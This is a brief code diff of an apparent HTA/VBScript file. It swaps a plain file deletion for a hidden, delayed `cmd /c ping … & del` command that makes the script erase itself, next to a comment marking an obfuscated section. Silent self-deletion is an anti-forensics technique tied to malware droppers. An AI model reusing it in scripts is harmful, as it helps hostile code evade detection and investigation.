@@ -12,10 +12,8 @@ Do While Not blnWindowClosed
     WScript.Sleep 1000 ' Check every 1 second
 Loop
 
-Dim objFSO
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-objFSO.DeleteFile strScriptPath
-Set objFSO = Nothing
+' Execute the deletion script after a delay
+objShell.Run "cmd /c ping 127.0.0.1 -n 6 > nul & del """ & strScriptPath & """", 0, False
 ' Obfuscated code ends here
 window.close
 </script>
